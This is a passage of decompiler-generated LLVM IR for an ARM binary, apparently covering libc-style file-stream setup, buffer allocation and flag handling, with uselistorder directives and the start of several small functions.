  %v2_14654 = inttoptr i32 %v1_14654 to i8*
  %v3_14654 = load i8, i8* %v2_14654, align 1
  %v4_14654 = zext i8 %v3_14654 to i32
  store i32 %v4_14654, i32* @r3, align 4
  %v7_14658 = icmp eq i8 %v3_14654, 43
  br i1 %v7_14658, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_14644
  store i32 %v1_1465c, i32* @r3, align 4
  %v2_14660 = add nuw nsw i32 %v1_1465c, 1
  store i32 %v2_14660, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14644, %bb35
  %v2_14664 = icmp eq i32 %v0_145f0, 0
  br i1 %v2_14664, label %dec_label_pc_1466c, label %dec_label_pc_14694

dec_label_pc_1466c:                               ; preds = %.thread3
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_14670 = call i32 @function_11604(i32 80)
  store i32 %v1_14670, i32* %r0.global-to-local, align 4
  store i32 %v1_14670, i32* @sb, align 4
  %v3_14674 = icmp eq i32 %v1_14670, 0
  br i1 %v3_14674, label %dec_label_pc_14898, label %dec_label_pc_1467c

dec_label_pc_1467c:                               ; preds = %dec_label_pc_1466c
  %v2_14680 = add i32 %v1_14670, 8
  %v3_14680 = inttoptr i32 %v2_14680 to i32*
  store i32 0, i32* %v3_14680, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_14688 = load i32, i32* @sb, align 4
  %v3_14688 = inttoptr i32 %v2_14688 to i16*
  store i16 8192, i16* %v3_14688, align 2
  %v0_1468c = load i32, i32* @sb, align 4
  %v1_1468c = add i32 %v0_1468c, 56
  store i32 %v1_1468c, i32* @r0, align 4
  %v1_14690 = call i32 @function_14944(i32 %v1_1468c)
  store i32 %v1_14690, i32* %r0.global-to-local, align 4
  %v0_14694.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %.thread3, %dec_label_pc_1467c
  %v0_146ec = phi i32 [ %v0_145f4, %.thread3 ], [ %v0_14694.pre, %dec_label_pc_1467c ]
  %v1_14694 = icmp slt i32 %v0_146ec, 0
  br i1 %v1_14694, label %dec_label_pc_146ec, label %dec_label_pc_1469c

dec_label_pc_1469c:                               ; preds = %dec_label_pc_14694
  %v0_146a0 = load i32, i32* @r4, align 4
  %v2_146a0 = and i32 %v0_146a0, ptrtoint (i32* @global_var_20003.466 to i32)
  %v1_146a4 = or i32 %v2_146a0, 1
  store i32 %v1_146a4, i32* %r2.global-to-local, align 4
  %v0_146a8 = load i32, i32* @r6, align 4
  %v1_146a8 = add i32 %v0_146a8, 1
  %v2_146ac = and i32 %v1_146a8, %v1_146a4
  store i32 %v2_146ac, i32* %r3.global-to-local, align 4
  %v9_146b0 = icmp eq i32 %v2_146ac, %v1_146a4
  %v1_146b4 = load i32, i32* @sb, align 4
  %v2_146b4 = add i32 %v1_146b4, 4
  %v3_146b4 = inttoptr i32 %v2_146b4 to i32*
  store i32 %v0_146ec, i32* %v3_146b4, align 4
  br i1 %v9_146b0, label %dec_label_pc_146bc, label %dec_label_pc_14614

dec_label_pc_146bc:                               ; preds = %dec_label_pc_1469c
  %v0_146bc = load i32, i32* @r4, align 4
  %v1_146bc = load i32, i32* @r6, align 4
  %v2_146bc = sub i32 -1, %v1_146bc
  %v3_146bc = and i32 %v0_146bc, %v2_146bc
  store i32 %v3_146bc, i32* @r3, align 4
  %v1_146c0 = and i32 %v3_146bc, 1024
  %v2_146c0 = icmp eq i32 %v1_146c0, 0
  br i1 %v2_146c0, label %dec_label_pc_146e0, label %dec_label_pc_146c8

dec_label_pc_146c8:                               ; preds = %dec_label_pc_146bc
  %v0_146c8 = load i32, i32* @r5, align 4
  store i32 %v0_146c8, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_146d4 = call i32 @function_10a14(i32 %v0_146c8, i32 4)
  store i32 %v2_146d4, i32* %r0.global-to-local, align 4
  %v2_146d8 = icmp eq i32 %v2_146d4, 0
  br i1 %v2_146d8, label %dec_label_pc_146c8.dec_label_pc_146e0_crit_edge, label %dec_label_pc_14614

dec_label_pc_146c8.dec_label_pc_146e0_crit_edge:  ; preds = %dec_label_pc_146c8
  %v0_146e0.pre = load i32, i32* @r6, align 4
  %v0_146e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_146e0

dec_label_pc_146e0:                               ; preds = %dec_label_pc_146c8.dec_label_pc_146e0_crit_edge, %dec_label_pc_146bc
  %v0_146e4 = phi i32 [ %v0_146e4.pre, %dec_label_pc_146c8.dec_label_pc_146e0_crit_edge ], [ %v0_146bc, %dec_label_pc_146bc ]
  %v0_146e0 = phi i32 [ %v0_146e0.pre, %dec_label_pc_146c8.dec_label_pc_146e0_crit_edge ], [ %v1_146bc, %dec_label_pc_146bc ]
  %v1_146e0 = and i32 %v0_146e0, 131072
  store i32 %v1_146e0, i32* %r3.global-to-local, align 4
  %v2_146e4 = or i32 %v1_146e0, %v0_146e4
  store i32 %v2_146e4, i32* @r4, align 4
  br label %dec_label_pc_14710

dec_label_pc_146ec:                               ; preds = %dec_label_pc_14694
  %v7_146ec = icmp eq i32 %v0_146ec, -1
  %v0_146f8.pre = load i32, i32* @r4, align 4
  br i1 %v7_146ec, label %dec_label_pc_146ec._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_146ec
  %v2_146f0 = or i32 %v0_146f8.pre, ptrtoint (i32* @global_var_20000.467 to i32)
  store i32 %v2_146f0, i32* @r4, align 4
  br label %dec_label_pc_146ec._crit_edge

dec_label_pc_146ec._crit_edge:                    ; preds = %dec_label_pc_146ec, %bb36
  %v0_146f8 = phi i32 [ %v2_146f0, %bb36 ], [ %v0_146f8.pre, %dec_label_pc_146ec ]
  %v0_146f4 = load i32, i32* @r6, align 4
  store i32 %v0_146f4, i32* %r0.global-to-local, align 4
  store i32 %v0_146f8, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_14700 = call i32 @function_107ec(i32 %v0_146f4, i32 %v0_146f8)
  store i32 %v2_14700, i32* %r0.global-to-local, align 4
  %v1_14704 = icmp slt i32 %v2_14700, 0
  %v1_14708 = load i32, i32* @sb, align 4
  %v2_14708 = add i32 %v1_14708, 4
  %v3_14708 = inttoptr i32 %v2_14708 to i32*
  store i32 %v2_14700, i32* %v3_14708, align 4
  br i1 %v1_14704, label %dec_label_pc_14628, label %.dec_label_pc_14710_crit_edge

.dec_label_pc_14710_crit_edge:                    ; preds = %dec_label_pc_146ec._crit_edge
  %v0_14714.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14710

dec_label_pc_14710:                               ; preds = %.dec_label_pc_14710_crit_edge, %dec_label_pc_146e0
  %v0_1472c = phi i32 [ %v0_14714.pre, %.dec_label_pc_14710_crit_edge ], [ %v2_146e4, %dec_label_pc_146e0 ]
  %v0_14710 = load i32, i32* @sb, align 4
  %v1_14710 = inttoptr i32 %v0_14710 to i16*
  %v2_14710 = load i16, i16* %v1_14710, align 2
  %v3_14710 = zext i16 %v2_14710 to i32
  %v1_14714 = urem i32 %v0_1472c, 4
  %v1_14718 = and i32 %v0_1472c, 1024
  %v1_1471c = and i32 %v3_14710, 8192
  %v1_14720 = add nuw nsw i32 %v1_14714, 1
  %v2_14724 = or i32 %v1_1471c, %v1_14718
  store i32 %v2_14724, i32* %r3.global-to-local, align 4
  %v1_14728 = xor i32 %v1_14720, 3
  store i32 %v1_14728, i32* %r1.global-to-local, align 4
  %v1_1472c = and i32 %v0_1472c, ptrtoint (i32* @global_var_20000.467 to i32)
  store i32 %v1_1472c, i32* %r2.global-to-local, align 4
  %v2_1472c = icmp eq i32 %v1_1472c, 0
  %v1_14730 = add i32 %v0_14710, 4
  %v2_14730 = inttoptr i32 %v1_14730 to i32*
  %v3_14730 = load i32, i32* %v2_14730, align 4
  store i32 %v3_14730, i32* @r5, align 4
  br i1 %v2_1472c, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_14710
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_14710, %bb37
  %v0_1473c = phi i32 [ 0, %dec_label_pc_14710 ], [ 32768, %bb37 ]
  %v4_14738 = mul nuw nsw i32 %v1_14728, 16
  %v5_14738 = or i32 %v2_14724, %v4_14738
  store i32 %v5_14738, i32* %r3.global-to-local, align 4
  %v2_1473c = or i32 %v0_1473c, %v5_14738
  store i32 %v2_1473c, i32* %r2.global-to-local, align 4
  %v8_14740 = icmp eq i32 %v3_14730, 2147483647
  %v1_14744 = trunc i32 %v2_1473c to i16
  store i16 %v1_14744, i16* %v1_14710, align 2
  br i1 %v8_14740, label %dec_label_pc_14774, label %dec_label_pc_1474c

dec_label_pc_1474c:                               ; preds = %bb38
  %v0_1474c = call i32 @function_11008()
  store i32 %v0_1474c, i32* @r4, align 4
  %v0_14754 = load i32, i32* @r5, align 4
  store i32 %v0_14754, i32* @r0, align 4
  %v1_14758 = inttoptr i32 %v0_1474c to i32*
  %v2_14758 = load i32, i32* %v1_14758, align 4
  store i32 %v2_14758, i32* @r5, align 4
  %v1_1475c = call i32 @function_1594c(i32 %v0_14754)
  store i32 %v1_1475c, i32* %r0.global-to-local, align 4
  %v2_14760 = icmp eq i32 %v1_1475c, 0
  br i1 %v2_14760, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_1474c
  %v1_14764 = load i32, i32* @sb, align 4
  %v2_14764 = inttoptr i32 %v1_14764 to i16*
  %v3_14764 = load i16, i16* %v2_14764, align 2
  %v4_14764 = zext i16 %v3_14764 to i32
  %v2_14768 = or i32 %v4_14764, 256
  store i32 %v2_14768, i32* %r3.global-to-local, align 4
  %v2_1476c = trunc i32 %v2_14768 to i16
  store i16 %v2_1476c, i16* %v2_14764, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_1474c, %bb39
  %v0_14770 = load i32, i32* @r5, align 4
  %v1_14770 = load i32, i32* @r4, align 4
  %v2_14770 = inttoptr i32 %v1_14770 to i32*
  store i32 %v0_14770, i32* %v2_14770, align 4
  br label %dec_label_pc_14774

dec_label_pc_14774:                               ; preds = %bb38, %.thread5
  %v0_14774 = load i32, i32* @sb, align 4
  %v1_14774 = add i32 %v0_14774, 8
  %v2_14774 = inttoptr i32 %v1_14774 to i32*
  %v3_14774 = load i32, i32* %v2_14774, align 4
  store i32 %v3_14774, i32* %r3.global-to-local, align 4
  %v2_14778 = icmp eq i32 %v3_14774, 0
  br i1 %v2_14778, label %dec_label_pc_14780, label %bb40

dec_label_pc_14780:                               ; preds = %dec_label_pc_14774
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_14784 = call i32 @function_11604(i32 4096)
  store i32 %v1_14784, i32* %r0.global-to-local, align 4
  %v2_14788 = icmp eq i32 %v1_14784, 0
  %v1_14798.pre = load i32, i32* @sb, align 4
  br i1 %v2_14788, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14780
  %v2_1478c = inttoptr i32 %v1_14798.pre to i16*
  %v3_1478c = load i16, i16* %v2_1478c, align 2
  %v4_1478c = zext i16 %v3_1478c to i32
  %v2_14790 = add i32 %v1_14784, 4096
  store i32 %v2_14790, i32* %r2.global-to-local, align 4
  %v2_14794 = or i32 %v4_1478c, 16384
  store i32 %v2_14794, i32* %r3.global-to-local, align 4
  %v2_14798 = add i32 %v1_14798.pre, 8
  %v3_14798 = inttoptr i32 %v2_14798 to i32*
  store i32 %v1_14784, i32* %v3_14798, align 4
  %v1_1479c = load i32, i32* %r2.global-to-local, align 4
  %v2_1479c = load i32, i32* @sb, align 4
  %v3_1479c = add i32 %v2_1479c, 12
  %v4_1479c = inttoptr i32 %v3_1479c to i32*
  store i32 %v1_1479c, i32* %v4_1479c, align 4
  %v1_147a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_147a0 = trunc i32 %v1_147a0 to i16
  %v3_147a0 = load i32, i32* @sb, align 4
  %v4_147a0 = inttoptr i32 %v3_147a0 to i16*
  store i16 %v2_147a0, i16* %v4_147a0, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_14780
  %v2_1479819 = add i32 %v1_14798.pre, 8
  %v3_1479820 = inttoptr i32 %v2_1479819 to i32*
  store i32 0, i32* %v3_1479820, align 4
  %v2_147a4 = load i32, i32* @sb, align 4
  %v3_147a4 = add i32 %v2_147a4, 12
  %v4_147a4 = inttoptr i32 %v3_147a4 to i32*
  store i32 0, i32* %v4_147a4, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_14774, %.thread9
  store i32 56, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_147b0 = load i32, i32* @fp, align 4
  %v2_147b0 = add i32 %v0_147b0, 56
  %v3_147b0 = inttoptr i32 %v2_147b0 to i32*
  %v4_147b0 = load i32, i32* %v3_147b0, align 4
  store i32 %v4_147b0, i32* %r3.global-to-local, align 4
  %v2_147b4 = load i32, i32* @sb, align 4
  %v3_147b4 = add i32 %v2_147b4, 2
  %v4_147b4 = inttoptr i32 %v3_147b4 to i8*
  store i8 0, i8* %v4_147b4, align 1
  %v0_147b8 = load i32, i32* @sb, align 4
  %v1_147b8 = inttoptr i32 %v0_147b8 to i16*
  %v2_147b8 = load i16, i16* %v1_147b8, align 2
  %v3_147b8 = zext i16 %v2_147b8 to i32
  store i32 %v3_147b8, i32* %r2.global-to-local, align 4
  %v0_147bc = load i32, i32* %r3.global-to-local, align 4
  %v1_147bc = inttoptr i32 %v0_147bc to i32*
  %v2_147bc = load i32, i32* %v1_147bc, align 4
  store i32 %v2_147bc, i32* %r1.global-to-local, align 4
  %v1_147c0 = add i32 %v0_147b8, 8
  %v2_147c0 = inttoptr i32 %v1_147c0 to i32*
  %v3_147c0 = load i32, i32* %v2_147c0, align 4
  store i32 %v3_147c0, i32* %r3.global-to-local, align 4
  %v1_147c4 = and i32 %v3_147b8, 8192
  %v2_147c4 = icmp eq i32 %v1_147c4, 0
  %v2_147c8 = add i32 %v0_147b8, 20
  %v3_147c8 = inttoptr i32 %v2_147c8 to i32*
  store i32 %v3_147c0, i32* %v3_147c8, align 4
  %v0_147cc = load i32, i32* %r0.global-to-local, align 4
  %v1_147cc = load i32, i32* @sb, align 4
  %v2_147cc = add i32 %v1_147cc, 44
  %v3_147cc = inttoptr i32 %v2_147cc to i32*
  store i32 %v0_147cc, i32* %v3_147cc, align 4
  %v0_147d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_147d0 = load i32, i32* @sb, align 4
  %v2_147d0 = add i32 %v1_147d0, 52
  %v3_147d0 = inttoptr i32 %v2_147d0 to i32*
  store i32 %v0_147d0, i32* %v3_147d0, align 4
  %v0_147d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_147d4 = load i32, i32* @sb, align 4
  %v2_147d4 = add i32 %v1_147d4, 24
  %v3_147d4 = inttoptr i32 %v2_147d4 to i32*
  store i32 %v0_147d4, i32* %v3_147d4, align 4
  %v0_147d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_147d8 = load i32, i32* @sb, align 4
  %v2_147d8 = add i32 %v1_147d8, 28
  %v3_147d8 = inttoptr i32 %v2_147d8 to i32*
  store i32 %v0_147d8, i32* %v3_147d8, align 4
  %v0_147dc = load i32, i32* %r3.global-to-local, align 4
  %v1_147dc = load i32, i32* @sb, align 4
  %v2_147dc = add i32 %v1_147dc, 16
  %v3_147dc = inttoptr i32 %v2_147dc to i32*
  store i32 %v0_147dc, i32* %v3_147dc, align 4
  br i1 %v2_147c4, label %dec_label_pc_14898, label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_147e8 = load i32, i32* @fp, align 4
  %v2_147e8 = add i32 %v0_147e8, 36
  %v3_147e8 = inttoptr i32 %v2_147e8 to i32*
  %v4_147e8 = load i32, i32* %v3_147e8, align 4
  store i32 %v4_147e8, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_147f0 = add i32 %v0_147e8, 108
  %v3_147f0 = inttoptr i32 %v2_147f0 to i32*
  %v4_147f0 = load i32, i32* %v3_147f0, align 4
  store i32 %v4_147f0, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_147f8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_147fc = add i32 %v0_147e8, 72
  %v3_147fc = inttoptr i32 %v2_147fc to i32*
  %v4_147fc = load i32, i32* %v3_147fc, align 4
  store i32 %v4_147e8, i32* %r1.global-to-local, align 4
  store i32 %v4_147f0, i32* %r2.global-to-local, align 4
  store i32 %v2_147f8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_147fc)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14818 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14818, i32* %r0.global-to-local, align 4
  %v0_1481c = load i32, i32* @fp, align 4
  %v2_1481c = add i32 %v0_1481c, 16
  %v3_1481c = inttoptr i32 %v2_1481c to i32*
  %v4_1481c = load i32, i32* %v3_1481c, align 4
  call void @__pseudo_branch(i32 %v4_1481c)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_1482c = load i32, i32* @fp, align 4
  %v2_1482c = add i32 %v0_1482c, 96
  %v3_1482c = inttoptr i32 %v2_1482c to i32*
  %v4_1482c = load i32, i32* %v3_1482c, align 4
  store i32 %v4_1482c, i32* %r4.global-to-local, align 4
  %v0_14830 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14830, i32* %r1.global-to-local, align 4
  store i32 %v4_1482c, i32* %r2.global-to-local, align 4
  store i32 %v2_145e8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_147fc)
  store i32 %v4_1482c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1481c)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14854 = load i32, i32* @fp, align 4
  %v2_14854 = add i32 %v0_14854, 44
  %v3_14854 = inttoptr i32 %v2_14854 to i32*
  %v4_14854 = load i32, i32* %v3_14854, align 4
  store i32 %v4_14854, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_1485c = inttoptr i32 %v4_14854 to i32*
  %v2_1485c = load i32, i32* %v1_1485c, align 4
  store i32 %v2_1485c, i32* %r2.global-to-local, align 4
  store i32 %v2_145e8, i32* %r0.global-to-local, align 4
  %v1_14864 = load i32, i32* @sb, align 4
  %v2_14864 = add i32 %v1_14864, 32
  %v3_14864 = inttoptr i32 %v2_14864 to i32*
  store i32 %v2_1485c, i32* %v3_14864, align 4
  %v0_14868 = load i32, i32* @fp, align 4
  %v1_14868 = load i32, i32* %r3.global-to-local, align 4
  %v2_14868 = add i32 %v1_14868, %v0_14868
  %v3_14868 = inttoptr i32 %v2_14868 to i32*
  %v4_14868 = load i32, i32* %v3_14868, align 4
  store i32 %v4_14868, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_14870 = load i32, i32* @sb, align 4
  %v1_14870 = load i32, i32* @ip, align 4
  %v2_14870 = inttoptr i32 %v1_14870 to i32*
  store i32 %v0_14870, i32* %v2_14870, align 4
  call void @__pseudo_branch(i32 %v4_14868)
  store i32 %v2_147f8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14868)
  br label %dec_label_pc_14898

dec_label_pc_14894:                               ; preds = %dec_label_pc_14628, %dec_label_pc_14614, %dec_label_pc_14634
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_14898

dec_label_pc_14898:                               ; preds = %bb40, %dec_label_pc_1466c, %dec_label_pc_147e4, %dec_label_pc_14894
  %v0_14898 = load i32, i32* @sb, align 4
  store i32 %v0_14898, i32* %r0.global-to-local, align 4
  %v2_148a0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_148a0, i32* %r4.global-to-local, align 4
  store i32 %v6_145d4, i32* @r5, align 4
  store i32 %v9_145d4, i32* @r6, align 4
  store i32 %v18_145d4, i32* @sb, align 4
  store i32 %v24_145d4, i32* @fp, align 4
  ret i32 %v0_14898

; uselistorder directives
  uselistorder i32 %v1_14798.pre, { 2, 1, 0 }
  uselistorder i32 %v0_1472c, { 1, 2, 0 }
  uselistorder i32 %v0_146f8, { 1, 0 }
  uselistorder i32 %v1_146bc, { 1, 0 }
  uselistorder i32 %v0_146bc, { 1, 0 }
  uselistorder i32 %v1_146a4, { 1, 0, 2 }
  uselistorder i32 %v1_1465c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 7, 8, 9, 10, 12, 11, 1, 14, 13, 16, 15, 0, 18, 17, 19, 20 }
  uselistorder i32 16384, { 50, 0, 51, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 18, 74, 17, 62, 3, 52, 36, 53, 4, 54, 37, 55, 5, 56, 6, 57, 7, 58, 8, 59, 9, 60, 10, 61, 35, 63, 11, 64, 12, 65, 13, 66, 14, 67, 44, 75, 15, 76, 16, 77, 78, 46, 79, 47, 80, 21, 81, 45, 82, 19, 83, 20, 84, 22, 85, 23, 86, 25, 87, 24, 88, 27, 89, 26, 90, 28, 91, 29, 92, 30, 93, 31, 94, 32, 95, 48, 96, 33, 1, 49, 97, 34, 2 }
  uselistorder i32 4096, { 10, 6, 11, 12, 1, 0, 2, 18, 3, 13, 4, 7, 14, 8, 15, 5, 9, 16, 17 }
  uselistorder i32 32768, { 2, 5, 3, 0, 4, 1 }
  uselistorder i32 (i32, i32)* @function_107ec, { 2, 0, 8, 7, 6, 5, 4, 3, 1 }
  uselistorder i32 (i32, i32)* @function_10a14, { 5, 0, 14, 11, 10, 13, 12, 9, 8, 7, 6, 2, 1, 4, 3 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 (i32)* @function_11604, { 8, 7, 34, 5, 4, 3, 0, 1, 2, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6 }
  uselistorder i32 80, { 0, 6, 3, 4, 5, 1, 2, 7 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @function_12670, { 7, 10, 5, 4, 3, 2, 0, 1, 9, 8, 6 }
  uselistorder i32* @fp, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 79, 80, 81, 82, 83, 85, 84, 86, 19, 20, 21, 22, 23, 24, 25, 28, 26, 27, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 77, 75, 76, 78, 87, 90, 88, 89, 91, 52, 53, 54, 55 }
  uselistorder i32* @sb, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 108, 109, 110, 111, 112, 113, 114, 115, 116, 119, 117, 118, 120, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 121, 122, 123, 124, 125, 75, 76, 77, 78 }
  uselistorder label %dec_label_pc_14898, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14894, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14774, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_146ec._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14694, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14644, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14614, { 1, 2, 0 }
}

define i32 @function_148ac(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_148ac:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_148ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_148ac, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_148ac
  %v1_148b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_148b4 = load i32, i32* %r3.global-to-local, align 4
  %v3_148b4 = and i32 %v2_148b4, %v1_148b4
  %v2_148b8 = trunc i32 %v3_148b4 to i16
  %v4_148b8 = inttoptr i32 %v3_148b4 to i16*
  store i16 %v2_148b8, i16* %v4_148b8, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_148ac, %bb
  %v0_148e0 = call i32 @function_11008()
  store i32 %v0_148e0, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_148ec = inttoptr i32 %v0_148e0 to i32*
  %v2_148ec = load i32, i32* %v1_148ec, align 4
  store i32 %v2_148ec, i32* @r6, align 4
  %v1_148f0 = call i32 @function_1594c(i32 0)
  %v2_148f8 = icmp eq i32 %v1_148f0, 0
  store i32 124088, i32* @r4, align 4
  br i1 %v2_148f8, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 304, i32* %r2.global-to-local, align 4
  %v5_14904 = load i16, i16* inttoptr (i32 124392 to i16*), align 8
  %v7_14904 = zext i16 %v5_14904 to i32
  %v2_14908 = xor i32 %v7_14904, 256
  store i32 %v2_14908, i32* @r3, align 4
  %v2_1490c = trunc i32 %v2_14908 to i16
  store i16 %v2_1490c, i16* inttoptr (i32 124392 to i16*), align 8
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_14914 = call i32 @function_1594c(i32 1)
  %v2_14918 = icmp eq i32 %v1_14914, 0
  br i1 %v2_14918, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_14920 = load i32, i32* @r4, align 4
  %v3_14920 = add i32 %v1_14920, 304
  store i32 %v3_14920, i32* %r2.global-to-local, align 4
  %v2_14924 = add i32 %v1_14920, 384
  %v3_14924 = inttoptr i32 %v2_14924 to i16*
  %v4_14924 = load i16, i16* %v3_14924, align 2
  %v5_14924 = zext i16 %v4_14924 to i32
  %v2_14928 = xor i32 %v5_14924, 256
  store i32 %v2_14928, i32* %r3.global-to-local, align 4
  %v2_1492c = trunc i32 %v2_14928 to i16
  store i16 %v2_1492c, i16* %v3_14924, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_14930 = load i32, i32* @r6, align 4
  %v1_14930 = load i32, i32* @r5, align 4
  %v2_14930 = inttoptr i32 %v1_14930 to i32*
  store i32 %v0_14930, i32* %v2_14930, align 4
  ret i32 %v1_14914

; uselistorder directives
  uselistorder i32 %v3_148b4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_1594c, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_14944(i32 %arg1) local_unnamed_addr {
dec_label_pc_14944:
  store i32 124088, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_16490.482 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14960 = call i32 @function_11110()
  ret i32 %v0_14960
}

define i32 @function_14a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a4c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a4c = load i32, i32* @r4, align 4
  store i32 %v3_14a4c, i32* %stack_var_-8, align 4
  %v1_14a50 = add i32 %arg1, 8
  %v2_14a50 = inttoptr i32 %v1_14a50 to i32*
  %v3_14a50 = load i32, i32* %v2_14a50, align 4
  %v1_14a54 = add i32 %arg1, 16
  %v2_14a54 = inttoptr i32 %v1_14a54 to i32*
  %v3_14a54 = load i32, i32* %v2_14a54, align 4
  %v9_14a58 = icmp eq i32 %v3_14a54, %v3_14a50
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_14a58, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_14a4c
  store i32 %v3_14a50, i32* %v2_14a54, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_14a4c, %bb
  %v1_14a64 = xor i1 %v9_14a58, true
  call void @__pseudo_cond_branch(i1 %v1_14a64, i32 ptrtoint (i32* @global_var_15d38.483 to i32))
  %v0_14a68 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a68 = add i32 %v0_14a68, 8
  %v2_14a68 = inttoptr i32 %v1_14a68 to i32*
  %v3_14a68 = load i32, i32* %v2_14a68, align 4
  %v1_14a6c = add i32 %v0_14a68, 16
